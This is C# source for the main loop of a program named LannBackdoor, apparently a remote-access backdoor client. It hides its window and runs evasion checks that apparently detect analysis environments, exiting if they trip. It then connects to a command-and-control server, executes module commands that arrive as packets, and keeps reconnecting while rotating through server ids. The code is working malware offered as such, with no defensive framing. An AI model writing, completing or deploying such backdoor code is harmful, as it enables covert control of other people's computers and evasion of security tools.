using System.Text;
using LannEvasion;
using LannLogger;
using LannUtils;
using ModulesApi;
using Networking;
using Networking.Packets;
using Networking.Structures;
using Serilog.Core;
using SystemModule;
using Constants = LannConstants.Constants;

namespace LannBackdoor;

public static class LannBackdoor {
    private static readonly Logger Logger = LoggerFactory.CreateLogger("LannBackdoor");
    private static TCPClient _tcpClient = null!;
    private static int _serverId;

    private static bool pinging = false;

    public static async Task Main() {
        Console.OutputEncoding = Encoding.UTF8;

        if (Constants.Debug) Logger.Debug("Running {Mode} mode", "DEBUG");
        else PInvoke.HideWindow();

        await Evasion.Protect();
        bool result = await Evasion.RunCheck();
        if (result) {
            Environment.Exit(0);
            return;
        }

        Logger.Information("Evasion check passed!");

        Logger.Information("Ohayou, ばか!");
        Logger.Information("Config:\n  - Debug: {Debug}\n  - Url: {URL}\n  - Port: {Port}",
            Constants.Debug,
            Utils.CreateUrl(_serverId),
            Constants.Port);
        
        new Thread(() => {
            while (true) {
                if (pinging) {
                    if (!_tcpClient.IsConnected) {
                        Logger.Error("Server is closed!");
                        _tcpClient.Dispose();
                    }
                }
            
                Thread.Sleep(5000);
            }
        }).Start();
        
        ModuleRegistry.LoadByAssembly(typeof(SystemModuleImpl).Assembly);
        await Connect();

        while (true) await Task.Delay(1000);
    }

    private static async Task Connect(bool inc = false) {
        _tcpClient = new TCPClient(Utils.CreateUrl(_serverId), Constants.Port);
        _tcpClient.OnConnect += async (_, _) => {
            Logger.Information("Connected!");
            await _tcpClient.SendPacket(new ClientPacket { Type = PacketType.Ready });
            pinging = true;
            _tcpClient.StartHandlingPackets();
        };

        _tcpClient.OnCommand += async (_, data) => {
            Packet packet = data.Packet;
            Logger.Information("Packet received: {Module}/{Handler}: {@Data}",
                packet.ModuleName,
                packet.HandlerName,
                packet.GetData<object>());

            ModuleInfo? module = ModuleRegistry.GetByName(packet.ModuleName);
            if (module == null) {
                Logger.Debug("Unknown module: {Name}", packet.ModuleName);
                return;
            }

            if (!_tcpClient.IsVerified && !module.Name.Equals("system")) {
                Logger.Fatal("Socket is not verified, but packet received!");
                _tcpClient.Dispose();
                return;
            }

            HandlerInfo? handler = module.GetHandler(packet.HandlerName);
            if (handler == null) {
                Logger.Debug("Unknown handler: {Module}/{Id}",
                    packet.ModuleName,
                    packet.HandlerName);
                return;
            }

            try {
                Type type = handler.GetDataType();
                await handler.Execute(_tcpClient, packet.GetData<object>(type));
            } catch (Exception e) {
                Logger.Error("Handler {Module}/{Handler} invocation failed: {Error}",
                    packet.ModuleName,
                    packet.HandlerName,
                    e);
            }
        };

        _tcpClient.OnClose += async (_, _) => {
            pinging = false;
            Logger.Information("Socket closed, reconnecting in 5000 ms");
            await Task.Delay(5000);
            await Connect();
        };

        try {
            await _tcpClient.Connect();
        } catch {
            Logger.Information("Connection failed, connecting to server {Id} in 5000 ms", inc ? ++_serverId : _serverId);
            await Task.Delay(5000);
            await Connect(true);
        }
    }
}